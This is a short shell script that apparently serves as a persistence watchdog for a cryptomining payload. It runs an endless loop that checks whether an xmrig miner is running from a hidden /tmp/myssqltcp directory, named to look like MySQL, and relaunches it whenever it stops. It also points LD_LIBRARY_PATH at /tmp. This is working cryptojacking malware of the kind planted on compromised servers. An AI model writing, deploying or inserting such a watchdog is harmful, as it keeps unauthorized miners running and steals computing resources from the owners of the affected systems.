#!/bin/sh


export LD_LIBRARY_PATH=/tmp

while true; do
      
        server=`ps aux | grep /tmp/myssqltcp/xmrig | grep -v grep`
        if [ ! "$server" ]; then
          
            cd /tmp/myssqltcp/ && ./xmrig.sh
           
            sleep 10
        fi
    
        sleep 5
done
